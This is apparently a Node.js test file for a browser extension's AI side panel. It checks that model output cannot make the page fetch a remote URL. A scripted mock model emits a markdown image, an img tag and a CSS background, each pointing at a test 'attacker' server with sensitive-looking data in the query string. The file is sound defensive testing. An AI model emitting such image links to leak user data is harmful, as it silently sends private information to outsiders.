/**
 * S1: model output must not make an extension page fetch a remote URL.
 * A markdown image or raw <img> pointing at an attacker server would send
 * whatever the model put in the query string with no click.
 */
import assert from "node:assert/strict";
import { after, before, describe, it } from "node:test";
import {
  chatAndWait,
  launchBrowser,
  openSidePanel,
  startMockModel,
  startPageServer,
  startServer,
} from "./harness.mjs";

let browser;
let model;
let site;
let attacker;
const attackerHits = [];

before(async () => {
  attacker = await startServer((req, res) => {
    attackerHits.push(req.url);
    res.writeHead(200, { "content-type": "image/png" }).end();
  });
  model = await startMockModel();
  site = await startPageServer({
    "/app.html": "<!doctype html><title>App</title><main>Hello</main>",
  });
  browser = await launchBrowser();
});

after(async () => {
  await browser?.close();
  model?.close();
  site?.close();
  attacker?.close();
});

describe("zero-click exfiltration through model output", () => {
  it("never requests an attacker URL from a markdown or HTML image", async () => {
    const leak = `${attacker.origin}/leak.png?d=PATIENT-NAME-MRN-123`;
    model.script(() => ({
      text: [
        "RESULT: here is your chart",
        `![x](${leak}&f=md)`,
        `<img src="${leak}&f=html">`,
        `<div style="background:url(${leak}&f=css)">styled</div>`,
      ].join("\n\n"),
    }));
    const app = await browser.context.newPage();
    await app.goto(`${site.origin}/app.html`);
    const panel = await openSidePanel(browser, model, app);

    await chatAndWait(panel, "Show me the chart");
    await panel.getByText("styled").waitFor();
    await panel.waitForTimeout(1500);

    assert.deepEqual(attackerHits, []);
    assert.equal(
      await panel.locator(`img[src*="${attacker.origin}"]`).count(),
      0,
    );
    await panel.close();
    await app.close();
  });

  it("blocks a remote image by CSP even when a renderer lets one through", async () => {
    attackerHits.length = 0;
    const app = await browser.context.newPage();
    await app.goto(`${site.origin}/app.html`);
    const panel = await openSidePanel(browser, model, app);
    const loaded = await panel.evaluate(
      (url) =>
        new Promise((resolve) => {
          const img = new Image();
          img.onload = () => resolve(true);
          img.onerror = () => resolve(false);
          img.src = url;
          document.body.append(img);
        }),
      `${attacker.origin}/csp.png?d=SECRET`,
    );
    assert.equal(loaded, false);
    assert.deepEqual(attackerHits, []);
    await panel.close();
    await app.close();
  });
});
